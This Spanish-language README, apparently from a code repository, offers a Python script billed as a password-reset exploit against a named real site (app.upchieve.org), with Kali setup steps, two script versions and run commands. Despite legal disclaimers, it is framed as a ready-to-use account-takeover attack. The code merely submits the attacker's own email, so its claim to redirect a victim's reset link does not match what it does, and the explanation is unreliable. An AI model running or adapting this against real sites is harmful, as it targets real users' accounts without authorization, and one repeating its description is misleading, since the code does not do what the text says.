# forgotpasswordvulnerabilitie
Este exploit es un script en Python diseñado para aprovechar una posible vulnerabilidad en un sistema de restablecimiento de contraseñas de una página web. El código simula una solicitud de restablecimiento de contraseña pero redirige el correo de restablecimiento al correo electrónico del atacante en lugar del correo legítimo del usuario. Este tipo de ataque puede permitir que el atacante obtenga control de la cuenta de la víctima si la vulnerabilidad existe.

¿Qué hace el código?
Define las cabeceras HTTP que simulan una solicitud legítima desde un navegador web hacia el servidor del sitio de restablecimiento de contraseñas.

Crea un payload que contiene el correo electrónico del atacante, engañando al servidor para que este correo reciba el enlace de restablecimiento de contraseña en lugar del correo de la víctima.

Guía de Uso del Exploit:
Advertencia: Este tipo de actividad es ilegal si se utiliza para explotar vulnerabilidades sin el consentimiento del propietario del sitio web. Asegúrate de tener permiso explícito antes de realizar pruebas de seguridad en cualquier sistema. Usa este conocimiento éticamente.
Pasos para ejecutar el script en Kali Linux:
Instalar Python y la librería requests:

Kali Linux generalmente ya viene con Python preinstalado. Para asegurarte de que lo tienes y actualizar, puedes ejecutar:



sudo apt update
sudo apt install python3 python3-pip
Luego, instala la librería requests si no la tienes instalada:

pip3 install requests
Crear el archivo Python con el exploit:

Abre una terminal y crea un archivo Python que contenga el código del exploit. Puedes hacerlo usando cualquier editor de texto, como nano. Por ejemplo:



nano exploit_reset_password.py
Luego, copia y pega el código del exploit en el archivo exploit_reset_password.py:

python

import requests

def exploit_reset_password(target_url, attacker_email):
    headers = {
        'Host': 'app.upchieve.org',  # Cambiar según el dominio del objetivo
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://app.upchieve.org',
        'Referer': 'https://app.upchieve.org/resetpassword',
        'X-Requested-With': 'XMLHttpRequest'
    }

    payload = {
        "email": attacker_email
    }

    try:
        response = requests.post(target_url, json=payload, headers=headers)
        
        if response.status_code == 200:
            print(f"Exploit enviado con éxito. Verifica tu correo: {attacker_email}")
        else:
            print(f"Fallo al enviar exploit. Código de estado: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"Error al intentar explotar: {e}")

# Ejemplo de uso
target_url = "https://app.upchieve.org/auth/reset/send"
attacker_email = "attacker.email@gmail.com"

exploit_reset_password(target_url, attacker_email)
Guarda el archivo presionando CTRL+O para guardar y luego CTRL+X para salir de nano.

Dar permisos de ejecución al archivo Python:

Para ejecutar el archivo Python en Kali Linux, debes asegurarte de que tiene los permisos correctos. Usa el siguiente comando para darle permisos de ejecución:



chmod +x exploit_reset_password.py
Ejecutar el exploit:

Ahora, puedes ejecutar el exploit desde la terminal de Kali Linux usando Python 3. Asegúrate de estar en el directorio donde guardaste el archivo exploit_reset_password.py, y luego ejecuta:



python3 exploit_reset_password.py
Esto enviará la solicitud de restablecimiento de contraseña al servidor web objetivo usando los parámetros que has especificado en el script.

Opciones avanzadas:
Modificar parámetros en tiempo de ejecución: Si quieres cambiar los valores de target_url o attacker_email sin editar el archivo cada vez, puedes modificar el código para aceptar esos valores como argumentos de la línea de comandos. Aquí tienes un ejemplo actualizado del script para aceptar estos parámetros:

python

import requests
import sys

def exploit_reset_password(target_url, attacker_email):
    headers = {
        'Host': 'app.upchieve.org',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://app.upchieve.org',
        'Referer': 'https://app.upchieve.org/resetpassword',
        'X-Requested-With': 'XMLHttpRequest'
    }

    payload = {
        "email": attacker_email
    }

    try:
        response = requests.post(target_url, json=payload, headers=headers)
        
        if response.status_code == 200:
            print(f"Exploit enviado con éxito. Verifica tu correo: {attacker_email}")
        else:
            print(f"Fallo al enviar exploit. Código de estado: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"Error al intentar explotar: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 exploit_reset_password.py <target_url> <attacker_email>")
    else:
        target_url = sys.argv[1]
        attacker_email = sys.argv[2]
        exploit_reset_password(target_url, attacker_email)
Ahora puedes ejecutarlo desde la terminal de la siguiente manera:



python3 exploit_reset_password.py https://app.upchieve.org/auth/reset/send attacker.email@gmail.com
Advertencia Legal:
Este tipo de pruebas deben hacerse únicamente en entornos controlados o con la debida autorización. Intentar explotar sistemas de manera no autorizada puede ser ilegal y violar leyes de seguridad informática.



NOTAS DEL CREADOR: Este exploit fue creado con la ayuda de chatgpt y el creador encontro la vulnerabilidad gracias a un video de HACKER FUDDI en youtube TODOS LOS CREDITOS A EL> https://www.youtube.com/watch?v=EI52YTRfGRU

